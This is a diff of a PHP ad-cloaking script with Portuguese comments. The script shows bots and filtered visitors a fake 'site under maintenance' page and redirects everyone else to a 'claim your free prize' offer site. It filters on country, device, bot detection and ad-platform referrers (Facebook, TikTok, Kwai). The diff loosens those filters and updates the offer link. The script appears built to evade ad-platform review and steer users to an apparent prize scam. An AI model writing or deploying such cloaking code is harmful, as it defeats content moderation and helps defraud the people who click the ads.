@@ -1,12 +1,12 @@
 <?php
 // ====================== CONFIGURAÇÕES (edite aqui se quiser mudar) ======================
-$allowed_countries   = ['BR'];        // ['BR'] = só Brasil | [] = libera todos os países
-$require_mobile      = true;          // true = só libera mobile | false = libera mobile + desktop
-$offer_url           = 'http://retireseupremiolivre.site/prevsl/'; // link final
+$allowed_countries   = [];            // [] = libera todos os países
+$require_mobile      = false;         // false = libera mobile + desktop
+$offer_url           = 'https://retireseupremiolivre.site/vsl/'; // link final
 $white_message       = 'Site em manutenção. Tente novamente em alguns instantes.'; // texto da página bloqueada
 
-// Referrers permitidos (Facebook, TikTok, Kwai + vazio = padrão de anúncios)
-$allowed_referrer_patterns = ['facebook', 'meta', 'tiktok', 'kwai', 'v.kwai'];
+// Referrers permitidos (vazio = libera todos)
+$allowed_referrer_patterns = [];
 // ==================================================================================
 
 // Pega IP real (funciona mesmo com proxy/Cloudflare)
@@ -79,10 +79,11 @@ function is_bot() {
     return false;
 }
 
-// Verifica referrer
+// Verifica referrer (array vazio = libera todos)
 function is_allowed_referrer() {
+    if (empty($GLOBALS['allowed_referrer_patterns'])) return true;
     $ref = strtolower($_SERVER['HTTP_REFERER'] ?? '');
-    if (empty($ref)) return true; // anúncios reais frequentemente vêm sem referrer
+    if (empty($ref)) return true;
     foreach ($GLOBALS['allowed_referrer_patterns'] as $p) {
         if (strpos($ref, $p) !== false) return true;
     }
